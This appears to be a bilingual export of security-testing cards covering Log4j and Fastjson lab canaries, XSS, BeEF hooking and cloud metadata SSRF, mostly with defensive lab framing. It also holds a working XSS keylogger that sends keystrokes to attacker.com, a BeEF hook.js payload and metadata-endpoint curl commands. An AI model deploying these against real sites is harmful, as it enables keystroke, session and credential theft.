name.zh: Log4j 本地消息 Lookup 策略验证

description.zh: 在无网络出口的本地日志 Fixture 中记录一个 Java 版本 Lookup 形状，验证消息替换策略和 network_lookup=false，不使用 JNDI 或外带。
description.en: Record one Java-version lookup shape in a no-egress local logging fixture to validate message-substitution policy and network_lookup=false without JNDI or exfiltration.

prerequisites.zh: 使用固定 Log4j 版本的 localhost Fixture，阻断 DNS、LDAP、RMI 与所有外部网络出口。
prerequisites.en: Use a localhost fixture with a fixed Log4j version and block DNS, LDAP, RMI, and all external network egress.

prerequisites.zh: 启用应用日志、替换器调试日志和网络否定证据，并准备普通文本对照。
prerequisites.en: Enable application logs, substitution diagnostics, and negative network evidence with a plain-text control.

title.zh: 本地消息 Lookup 策略检查

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/log4j/log" -H "Content-Type: application/json" -H "X-Request-ID: log4j-lookup-001" --data '{"message":"LOOKUP_CANARY_${java:version}"}' | jq -e '.request_id and .network_lookup == false and .logged_value'

description.zh: 记录不含 JNDI 的 Java 版本 Lookup 形状，并断言本地 Fixture 没有产生网络查找。
description.en: Log a Java-version lookup shape without JNDI and assert that the local fixture produced no network lookup.

analysis.zh: 本地 Java Lookup 的展开只能说明消息替换行为，不能证明 JNDI 可达或 RCE。阳性安全结论必须结合确切受影响版本、远程 Lookup 能力与出口；本批刻意不产生远程请求，因此只报告策略与版本证据。
analysis.en: Expansion of a local Java lookup establishes message-substitution behavior only, not reachable JNDI or RCE. A security conclusion requires an affected version, remote-lookup capability, and egress; this batch intentionally creates no remote request and reports policy plus version evidence only.

opsecTips.zh: Fixture 关闭全部网络出口，消息不包含 jndi、环境变量、主机名或远程协议。
opsecTips.en: Block all fixture egress and keep jndi, environment variables, hostnames, and remote protocols out of the message.

opsecTips.zh: 每次只记录一个固定 Canary，五秒内完成并清理包含运行时版本的测试日志。
opsecTips.en: Log one fixed canary per run, finish within five seconds, and remove test logs containing runtime-version details.

title.zh: 固定 Log4j 运行条件

description.zh: 记录 log4j-core 版本、Java 版本、消息替换配置和网络阻断状态。
description.en: Record log4j-core version, Java version, substitution configuration, and egress-block state.

title.zh: 提交本地 Lookup Canary

description.zh: 向 localhost 日志 Fixture 提交不含 JNDI 的固定消息，并要求返回网络标志。
description.en: Submit the fixed non-JNDI message to the localhost logging fixture and require a network flag.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/log4j/log" -H "Content-Type: application/json" -H "X-Request-ID: log4j-lookup-001" --data '{"message":"LOOKUP_CANARY_${java:version}"}' | jq -e '.request_id and .network_lookup == false and .logged_value'

title.zh: 核对日志与网络否定证据
title.en: Check logs and negative network evidence

description.zh: 按请求 ID 对齐记录值、替换日志和零 DNS、LDAP、RMI 事件。
description.en: Align logged value, substitution diagnostics, and zero DNS, LDAP, or RMI events by request ID.

title.zh: 升级依赖并重放

description.zh: 升级并关闭不需要的 Lookup 后重放普通文本与 Canary，确认无网络行为。
description.en: After upgrade and disabling unnecessary lookups, replay plain text and the canary to confirm no network behavior.

overview.zh: 该 Payload 只观察安全的本地消息 Lookup 是否按配置展开或原样记录，并明确确认没有网络查找。它不包含 jndi 名称、远程 URI、环境变量或命令路径，因此结果用于验证消息替换策略，而不是复现 Log4Shell 利用链。
overview.en: This payload observes whether a safe local message lookup is expanded or logged literally and explicitly confirms no network lookup. It contains no jndi name, remote URI, environment variable, or command path, so it validates substitution policy rather than reproducing Log4Shell.

vulnerability.zh: Log4Shell 风险取决于受影响 Log4j 版本、消息 Lookup、JNDI 组件、Java 运行时、类路径和网络出口。看到带花括号文本被记录或展开不等于远程查找，更不等于代码执行；版本与运行配置必须同时成立。
vulnerability.en: Log4Shell risk depends on the affected Log4j version, message lookups, JNDI components, Java runtime, classpath, and egress. Logging or expanding brace-delimited text does not establish a remote lookup or code execution; version and runtime conditions must align.

exploitation.zh: 提交一个带固定请求 ID 的 Java 版本 Lookup 形状，读取 Fixture 返回的 logged_value 和 network_lookup。关联应用日志与阻断网络遥测，确认测试没有产生 DNS、LDAP 或 RMI 请求。禁止换成 jndi、环境属性、反向连接或混淆表达式。
exploitation.en: Submit one Java-version lookup shape with a fixed request ID and inspect logged_value plus network_lookup. Correlate application logs with blocked-network telemetry to confirm no DNS, LDAP, or RMI request occurred. Do not substitute jndi, environment properties, callbacks, or obfuscation.

mitigation.zh: 升级到 Apache 公告认可的安全版本，移除不需要的 JNDI Lookup 能力，限制应用网络出口，并避免记录未经规范化的敏感输入。通过依赖锁文件、运行时 JAR 清单和安全日志持续核对实际加载版本。
mitigation.en: Upgrade to a version recognized as safe by Apache advisories, remove unnecessary JNDI lookup capability, restrict application egress, and avoid logging unnormalized sensitive input. Continuously verify the loaded version through lockfiles, runtime JAR inventories, and security logs.

name.zh: Fastjson AutoType 策略边界验证
name.en: Fastjson Auto Type Policy Boundary Validation

description.zh: 在 localhost 解析 Fixture 中使用无副作用 HashMap 类型标记，验证 AutoType、允许类型和外部查找策略，而不加载 gadget 或发起网络请求。
description.en: Validate Auto Type, allowed-class, and external-lookup policy in a localhost parsing fixture with a side-effect-free Hash Map marker and no gadget loading or network request.

prerequisites.zh: 使用隔离 Fastjson Fixture，固定依赖版本并禁用网络出口和类实例化副作用。
prerequisites.en: Use an isolated Fastjson fixture with a fixed dependency version, no network egress, and no side-effectful class instantiation.

prerequisites.zh: 准备普通 JSON 对照和一个 java.util.HashMap 类型标记，启用类型解析审计日志。
prerequisites.en: Prepare a plain JSON control and one java.util.Hash Map type marker with type-resolution audit logs enabled.

title.zh: 无害 AutoType 策略检查

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/fastjson/parse" -H "Content-Type: application/json" -H "X-Request-ID: fastjson-policy-001" --data '{"@type":"java.util.HashMap","marker":"FASTJSON_POLICY_CANARY_A1"}' | jq -e '.marker == "FASTJSON_POLICY_CANARY_A1" and .external_lookup == false'

description.zh: 向无网络出口的本地解析器提交 HashMap 类型标记，并断言合成 marker 保留且 external_lookup=false。
description.en: Submit a Hash Map type marker to the no-egress local parser and assert that the synthetic marker remains while external_lookup is false.

analysis.zh: 接受无害 HashMap 类型不等于 RCE，拒绝未知类型也不证明所有历史链均不可达。有效结论应限定到确切版本、配置、类路径和解析日志，并确认测试期间没有 DNS、LDAP、RMI 或其他网络活动。
analysis.en: Accepting a harmless Hash Map type is not RCE, and rejecting one unknown type does not prove every historical chain unreachable. Conclusions must be limited to the exact version, configuration, classpath, and parse logs with no DNS, LDAP, RMI, or other network activity.

opsecTips.zh: 只使用 java.util.HashMap 和合成标记，禁止任何远程引用、gadget 或字节码字段。
opsecTips.en: Use only java.util.Hash Map and a synthetic marker, with no remote references, gadgets, or bytecode fields.

opsecTips.zh: Fixture 禁用网络出口并设置五秒超时，测试后删除解析日志中的请求正文。
opsecTips.en: Disable fixture egress, enforce a five-second timeout, and remove request bodies from parse logs after testing.

title.zh: 固定解析器版本和策略

description.zh: 记录 Fastjson 版本、AutoType 设置、允许类型和网络隔离状态。
description.en: Record Fastjson version, Auto Type setting, allowed classes, and network-isolation state.

title.zh: 提交无害类型标记

description.zh: 向 localhost Fixture 提交 HashMap Canary，并要求返回解析与外部查找状态。
description.en: Submit the Hash Map canary to the localhost fixture and require parse and external-lookup status.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/fastjson/parse" -H "Content-Type: application/json" -H "X-Request-ID: fastjson-policy-001" --data '{"@type":"java.util.HashMap","marker":"FASTJSON_POLICY_CANARY_A1"}' | jq -e '.marker == "FASTJSON_POLICY_CANARY_A1" and .external_lookup == false'

title.zh: 关联类型决策日志

description.zh: 按请求 ID 对齐类型解析、拒绝原因和无网络事件，排除普通字段回显。
description.en: Align type resolution, rejection reason, and absence of network events by request ID, excluding ordinary reflection.

title.zh: 收紧允许列表并回归

description.zh: 应用显式 DTO 与类型允许列表后重放普通、允许和未知类型三个对照。
description.en: After explicit DTO and type-allowlist controls, replay plain, allowed, and unknown-type controls.

overview.zh: 该边界只检查解析器是否按预期处理一个无害类型标记，并确认不会触发外部查找。先提交普通对象建立字段基线，再加入 HashMap 类型元数据，比较解析结果、拒绝原因和类型解析日志；不使用 JdbcRowSet、BCEL 或任何远程引用。
overview.en: This boundary checks how the parser handles one harmless type marker and confirms that no external lookup occurs. Compare a plain object with a Hash Map-marked object using parse results, rejection reasons, and type-resolution logs without Jdbc Row Set, BCEL, or remote references.

vulnerability.zh: 风险来自旧版或宽松配置接受客户端控制的多态类型，并在反序列化期间实例化具有危险构造器、Setter 或远程查找行为的类。AutoType 是否开启只是一个条件，只有不受信类型可到达有副作用类路径才形成可利用边界。
vulnerability.en: Risk arises when an outdated or permissive configuration accepts client-controlled polymorphic types and instantiates classes with dangerous constructors, setters, or remote-lookup behavior. Auto Type alone is only a precondition; exploitability requires an untrusted type to reach a side-effectful class path.

exploitation.zh: 向本地解析端点发送固定 HashMap Canary，并断言返回标记、类型决策和 external_lookup=false。若配置拒绝类型，应记录明确拒绝；若允许，也只能确认策略行为，不能推断远程代码执行。禁止替换为 JNDI、ClassLoader 或字节码类。
exploitation.en: Send the fixed Hash Map canary to the local parser and assert the marker, type decision, and external_lookup=false. Rejection should be explicit; acceptance establishes policy behavior only and does not imply code execution. Never substitute JNDI, class loaders, or bytecode-bearing classes.

mitigation.zh: 升级到供应商维护版本，优先避免客户端控制类型元数据，并使用显式 DTO 与类型允许列表。关闭不需要的 AutoType，限制类加载和网络出口，对拒绝类型建立审计，同时用无害允许类、未知类和普通对象做回归。
mitigation.en: Upgrade to a maintained vendor version, avoid client-controlled type metadata, and use explicit DT Os and type allowlists. Disable unnecessary Auto Type, restrict class loading and egress, audit rejected types, and regress harmless allowed, unknown, and plain objects.

overview.zh: 浏览器解析突变 XSS聚焦以下边界：比较净化前后 DOM，确认浏览器修复或重排标记时是否重新形成可执行节点。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: 浏览器解析突变 XSS聚焦以下边界：比较净化前后 DOM，确认浏览器修复或重排标记时是否重新形成可执行节点。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

overview.zh: XSS 过滤与规范化差异聚焦以下边界：验证黑名单、大小写处理、标记修复和空白规范化是否在编码之前留下可执行差异。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: XSS Filtering and Canonicalization Differences focuses on this boundary: Tests whether blacklists, case handling, markup repair, or whitespace normalization leaves an executable difference before output encoding. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

title.zh: 关联 XSS 多上下文输入边界 的服务端证据

description.zh: 把唯一标记与解析器、代理、应用、数据库或浏览器证据按时间关联，并排除回显、缓存、重试、客户端修改和统一错误页。

title.zh: 修复 XSS 多上下文输入边界 并重放基线
title.en: Remediate XSS Multi-Context Input Boundary and Replay the Baseline

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: XSS 多上下文输入边界聚焦以下边界：用单一无害标记识别输入落入的真实 HTML、属性、URL 或脚本上下文，不宣称存在通用载荷。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: XSS Multi-Context Input Boundary focuses on this boundary: Uses one harmless marker to identify the actual HTML, attribute, URL, or script context without claiming that a universal payload exists. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

execution.command:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>

prerequisites.en: has XSS Vulnerability

prerequisites.zh: 部署BeEF服务器
prerequisites.en: Deployment BeEF Server

title.zh: 注入 BeEF Hook

description.zh: 在隔离测试页面加载已授权 BeEF 实例的 Hook 脚本。
description.en: Load the hook script from an authorized BeEF instance in an isolated test page.

analysis.zh: 成功证据必须同时包含可执行 DOM、hook.js 请求和隔离 BeEF 会话；只有 URL 可达或前端显示变化不足以确认。
analysis.en: Confirmation requires an executable DOM, a hook.js request, and an isolated BeEF session; URL reachability or a UI-only change is insufficient.

opsecTips.zh: 只连接自有测试实例，并使用无真实 Cookie、账号或扩展的隔离浏览器配置。
opsecTips.en: Connect only to an owned test instance and use an isolated browser profile without real cookies, accounts, or extensions.

opsecTips.zh: 设置短测试窗口，完成后删除记录、关闭会话并停止 BeEF 服务。
opsecTips.en: Use a short test window, then remove records, close sessions, and stop the BeEF service.

title.zh: 确认 HTML 解析边界

description.zh: 用随机文本和无害标签确认输入进入目标 Sink，并记录编码、DOM 与 CSP 基线。
description.en: Use a random marker and harmless tag to confirm the target sink and record encoding, DOM, and CSP baselines.

title.zh: 加载授权 Hook

description.zh: 在隔离测试浏览器提交 Hook 标签，关联脚本请求、控制台与 BeEF 测试会话。
description.en: Submit the hook tag in an isolated browser and correlate the script request, console, and BeEF test session.

attackChain.payload: <script src="http://{BEEF_HOST}:3000/hook.js"></script>

title.zh: 排除网络与预加载假阳性
title.en: Exclude network and preload false positives

description.zh: 比较 CSP 阻断、纯文本 Sink 和禁用扩展的结果，确认脚本实际执行而非仅发生请求。
description.en: Compare CSP-blocked, text-only, and extension-disabled cases to prove execution rather than a request alone.

title.zh: 修复、清理并重放

description.zh: 应用上下文编码和严格 CSP，删除测试记录与会话，再重放相同输入确认只显示文本。
description.en: Apply context-aware encoding and strict CSP, remove test records and sessions, and replay the input to confirm text-only rendering.

overview.zh: 本条只描述 XSS Sink 中的 Hook 标签，不再混入 BeEF 安装、控制台和模块清单。验证前应先用普通标记确认输入进入 HTML 解析上下文，再在隔离测试浏览器和自有 BeEF 实例之间建立可回滚的观测链。
overview.en: This entry covers only the hook tag placed in an XSS sink; BeEF installation, console use, and module references belong to the tool card. Confirm the HTML parsing context with a plain marker before using an isolated browser and an owned BeEF instance for observable, reversible validation.

vulnerability.zh: 应用把不可信输入拼入 HTML 而未按上下文编码或消毒，浏览器因此创建外部 script 元素。若 CSP 还允许该脚本源，页面会请求 hook.js 并在当前源的浏览器上下文中执行；BeEF 只是观测执行的框架，根因仍是 XSS 输出边界失效。
vulnerability.en: The application inserts untrusted input into HTML without context-aware encoding or sanitization, causing the browser to create an external script element. If CSP permits the source, hook.js is fetched and executed in the page context. BeEF observes the result, while the root cause remains the failed XSS output boundary.

exploitation.zh: 先提交随机文本并记录最终 DOM；再在隔离浏览器加载本条 Hook，关联 hook.js 网络请求、控制台错误和 BeEF 测试会话；随后用被编码的同值、禁止外部脚本的 CSP 和纯文本 Sink 对照，排除预加载、浏览器扩展或仅网络可达但未执行等假阳性。完成后关闭测试会话并删除记录。
exploitation.en: Submit a random marker and record the final DOM, then load this hook in an isolated browser and correlate the hook.js request, console errors, and BeEF test session. Compare an encoded value, a CSP that blocks external scripts, and a text-only sink to exclude preloading, browser extensions, or network reachability without execution. Close the test session and remove the record afterward.

mitigation.zh: 按 HTML 文本、属性、URL 和 JavaScript 上下文分别编码；确需富文本时使用维护中的消毒器；部署基于 nonce/hash 的严格 CSP 并限制 connect-src；避免 innerHTML 等危险 DOM API，同时对后台、导出和通知等所有 Sink 做同值回归测试。
mitigation.en: Encode separately for HTML text, attributes, UR Ls, and Java Script contexts; use a maintained sanitizer for required rich text; deploy a strict nonce- or hash-based CSP with constrained connect-src; avoid dangerous DOM AP Is such as inner HTML; and replay the same regression value in administrative, export, and notification sinks.

name.zh: GCP Compute Metadata SSRF 验证

description.zh: 在自有 GCP 实验实例中验证 SSRF 客户端是否能设置 Metadata-Flavor: Google 并访问 computeMetadata/v1；不读取 OAuth Token、SSH 密钥或 kube-env。
description.en: Validates on an owned GCP lab instance whether an SSRF client can set Metadata-Flavor: Google and access compute Metadata/v1, without retrieving O Auth tokens, SSH keys, or kube-env.

prerequisites.zh: 仅在自有 GCP 实验项目与专用虚拟机执行，并为服务账号移除非验证所需权限。
prerequisites.en: Run only in an owned GCP lab project and dedicated VM, removing permissions that the service account does not need for validation.

prerequisites.zh: 设置短超时、关闭重试和响应持久化，禁止请求 token、SSH keys、kube-env 或其他敏感属性值。
prerequisites.en: Set a short timeout, disable retries and response persistence, and prohibit requests for token, SSH keys, kube-env, or other sensitive attribute values.

title.zh: 读取元数据根目录

description.zh: 在自有 GCP 实验实例上读取元数据目录名称，不递归获取属性值或服务账号令牌。
description.en: Read metadata directory names on an owned GCP lab instance without recursively retrieving attribute values or service-account tokens.

title.zh: 读取服务账号邮箱标识

description.zh: 只读取实验服务账号邮箱以确认端点边界，不请求 default/token，也不使用该身份访问其他 API。
description.en: Read only the lab service-account email to validate the endpoint boundary without requesting default/token or using the identity against another API.

title.zh: 读取服务账号作用域列表

description.zh: 读取实验服务账号作用域名称并与项目基线比较，不获取凭据、令牌或资源数据。
description.en: Read scope names for the lab service account and compare them with the project baseline without retrieving credentials, tokens, or resource data.

title.zh: 读取实验项目标识

description.zh: 只读取实验项目 ID 作为最小证据，并避免继续枚举组织、资源或其他项目。
description.en: Read only the lab project ID as minimal evidence and avoid enumerating organizations, resources, or other projects.

title.zh: 列出项目属性键名

description.zh: 只列出实验项目属性键名，不读取 ssh-keys 或其他可能包含敏感配置的属性值。
description.en: List only lab project attribute key names without reading ssh-keys or other attribute values that may contain sensitive configuration.

title.zh: 列出实例属性键名

description.zh: 只列出实验实例属性键名，不读取 kube-env、启动脚本、SSH 密钥或其他属性内容。
description.en: List only lab instance attribute key names without reading kube-env, startup scripts, SSH keys, or other attribute contents.

analysis.zh: 阳性需要应用进程最终连接到 GCP 元数据地址、实际发送 Metadata-Flavor: Google，并把 computeMetadata/v1 响应传播到可控输出。要求请求头的错误、域名解析、HTTP 状态或测试者本机访问均不足以确认。
analysis.en: A positive result requires the application process to connect to a GCP metadata address, actually send Metadata-Flavor: Google, and propagate a compute Metadata/v1 response into a controlled output. An error requesting the header, DNS resolution, HTTP status, or tester-workstation access is insufficient.

opsecTips.zh: 不访问 default/token、SSH keys、kube-env、启动脚本或递归属性输出。
opsecTips.en: Do not access default/token, SSH keys, kube-env, startup scripts, or recursive attribute output.

opsecTips.zh: 发现非实验项目、凭据样式内容或超出最小字段的响应时立即停止并清除。
opsecTips.en: Stop and purge the response if it identifies a non-lab project, resembles credentials, or exceeds the minimal fields.

title.zh: 对比主机名与链路本地地址

description.zh: 在同一实验实例中比较两个官方寻址形式，验证修复必须按最终连接地址分类，而不是只过滤主机字符串。
description.en: Compare the two documented addressing forms on one lab instance to verify that remediation classifies the final connected address rather than filtering only a hostname string.

title.zh: 记录服务端取回器网络基线
title.en: 记录服务端取回器网络基线

description.zh: 使用自有 HTTPS 标记端点记录 DNS、重定向、最终连接 IP、请求头和响应传播方式。
description.en: Use an owned HTTPS marker endpoint to record DNS, redirects, final connected IP, headers, and response propagation.

title.zh: 提交最小元数据根目录请求
title.en: Submit the Minimal Metadata Root Request

description.zh: 通过实验应用运行第一条样例，并在出站日志确认 computeMetadata/v1 与 Metadata-Flavor: Google。
description.en: Run the first sample through the lab application and confirm compute Metadata/v1 plus Metadata-Flavor: Google in egress logs.

attackChain.payload: curl -sS --max-time 3 --noproxy "*" -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"

title.zh: 关联 GCP 审计与响应证据
title.en: Correlate GCP Audit and Response Evidence

description.zh: 确认响应结构、实验实例身份和唯一标记一致，并排除本机 curl、代理错误页、DNS 缓存或字符串回显。
description.en: Confirm that response structure, lab instance identity, and unique marker agree, excluding workstation curl, proxy error pages, DNS cache, or string reflection.

title.zh: 阻断元数据地址并回归

description.zh: 对解析地址、重定向和敏感头实施限制后，重放外部正常请求与两种元数据地址对照。
description.en: Constrain resolved addresses, redirects, and sensitive headers, then replay the normal external request and both metadata address controls.

overview.zh: GCP Compute Engine 元数据端点使用 metadata.google.internal 或链路本地地址，并在 computeMetadata/v1 路径上要求 Metadata-Flavor: Google 请求头。这里没有通用的“Instance Metadata API v2”切换项；验证重点是服务端取回器是否允许最终目标和请求头同时受用户控制。
overview.en: GCP Compute Engine 元数据端点使用 metadata.google.internal 或链路本地地址，并在 compute Metadata/v1 路径上要求 Metadata-Flavor: Google 请求头。这里没有通用的“Instance Metadata API v2”切换项；验证重点是服务端取回器是否允许最终目标和请求头同时受用户控制。

vulnerability.zh: 如果应用可访问元数据地址、允许添加 Metadata-Flavor: Google，并将响应返回给用户，就可能暴露实例、项目或服务账号元数据。仅能访问主机名、收到要求请求头的错误或在测试者电脑上运行 curl 都不确认 SSRF；必须证明应用进程的最终连接和请求头。
vulnerability.en: An application may expose instance, project, or service-account metadata when it can reach the metadata address, add Metadata-Flavor: Google, and return the response to a user. Reaching the hostname, receiving an error that asks for the header, or running curl on the tester workstation does not confirm SSRF; the application process final connection and header must be proven.

exploitation.zh: 先用自有 HTTPS 标记服务确认请求器的重定向、DNS 和请求头行为，再通过实验应用请求元数据根目录或低敏感度字段。每次只运行一个样例，阳性由出站连接、Metadata-Flavor 请求头、computeMetadata/v1 响应和唯一请求标记共同确认；不读取访问令牌。
exploitation.en: First use an owned HTTPS marker service to characterize redirects, DNS, and header behavior. Then request the metadata root or a lower-sensitivity field through the lab application. Run one sample at a time. Confirm a positive result with the outbound connection, Metadata-Flavor header, compute Metadata/v1 response, and a unique request marker, without reading an access token.

mitigation.zh: 在解析后和每次重定向后阻止链路本地、回环与私网地址，固定允许的协议、主机和端口，并禁止用户控制 Metadata-Flavor 等敏感头；通过防火墙或工作负载边界限制元数据访问，采用最小权限服务账号并监控异常 computeMetadata/v1 请求。
mitigation.en: Block link-local, loopback, and private addresses after resolution and every redirect; allowlist schemes, hosts, and ports; and prevent user control of sensitive headers such as Metadata-Flavor. Restrict metadata access at the firewall or workload boundary, use least-privilege service accounts, and monitor anomalous compute Metadata/v1 requests.

name.zh: Azure 实例元数据 SSRF 验证

description.zh: 在自有 Azure 实验虚拟机中验证 SSRF 客户端是否能够设置必需的 Metadata:true 请求头并到达实例元数据服务；不获取托管身份访问令牌。
description.en: Validates on an owned Azure lab VM whether an SSRF client can set the required Metadata:true header and reach the instance metadata service, without retrieving managed-identity access tokens.

prerequisites.zh: 仅在自有 Azure 实验虚拟机和专用测试应用中执行，并确认元数据响应不会被返回给非授权用户。
prerequisites.en: Run only on an owned Azure lab VM and dedicated test application, and ensure metadata responses cannot be returned to unauthorized users.

prerequisites.zh: 先关闭请求重试并设置短超时；禁止查询 identity/oauth2/token、userData 或任何可能含凭据的字段。
prerequisites.en: Disable retries and set a short timeout first; do not query identity/oauth2/token, user Data, or any field that may contain credentials.

title.zh: 读取实例元数据根对象
title.en: Read the Instance Metadata Root Object

description.zh: 在自有 Azure 实验虚拟机上读取实例对象并保存最小字段，确认必需请求头与链路本地目标均受控。
description.en: Read the instance object on an owned Azure lab VM and preserve minimal fields, confirming control of both the required header and link-local destination.

title.zh: 读取托管身份公开标识

description.zh: 只读取托管身份标识信息以验证端点边界，不请求 OAuth 访问令牌，也不调用 Azure 管理 API。
description.en: Read only managed-identity identifiers to validate the endpoint boundary without requesting an OAuth access token or calling an Azure management API.

title.zh: 读取计算元数据对象

description.zh: 获取实验虚拟机的计算元数据并限制保存范围，用于与 Azure 控制面资产记录进行一致性核对。
description.en: Retrieve compute metadata for the lab VM with limited retention and compare it with the Azure control-plane asset record.

title.zh: 读取网络元数据对象

description.zh: 读取实验虚拟机的网络元数据并仅保存验证所需地址，避免把响应扩展到其他资源或订阅。
description.en: Read network metadata for the lab VM and preserve only addresses required for validation without expanding to other resources or subscriptions.

title.zh: 读取单个实例名称字段

description.zh: 使用 format=text 只读取实例名称作为最小阳性证据，降低记录完整元数据对象带来的数据暴露。
description.en: Use format=text to read only the instance name as minimal positive evidence and reduce exposure from retaining a complete metadata object.

analysis.zh: 阳性必须包含服务端最终连接地址、实际发送的 Metadata:true、IMDS 响应结构和应用到响应的可控传播路径。URL 被接受、出现 401/400、普通重定向或客户端本机直连都不能证明应用 SSRF 到达 Azure IMDS。
analysis.en: 阳性必须包含服务端最终连接地址、实际发送的 Metadata:true、IMDS 响应结构和应用到响应的可控传播路径。URL 被接受、出现 401/400、普通重定向或客户端本机直连都不能证明应用 SSRF 到达 Azure IMDS。

opsecTips.zh: 不请求访问令牌、userData 或完整订阅信息，只保留最小实例字段。
opsecTips.en: Do not request access tokens, user Data, or full subscription information; retain only minimal instance fields.

opsecTips.zh: 检测到身份令牌、凭据样式内容或非实验订阅标识时立即停止并清除响应。
opsecTips.en: Stop immediately and purge the response if an identity token, credential-like content, or non-lab subscription identifier appears.

title.zh: 对比缺失与存在 Metadata 头
title.en: Compare Missing and Present Metadata Headers

description.zh: 在同一实验虚拟机中对比无头与有头请求，证明服务端要求 Metadata:true，而不是把重定向或响应差异描述为绕过。
description.en: Compare requests without and with Metadata:true on the same lab VM to prove the service requirement rather than describing a redirect or response difference as a bypass.

title.zh: 建立受控外部取回基线
title.en: Establish a Controlled External Fetch Baseline

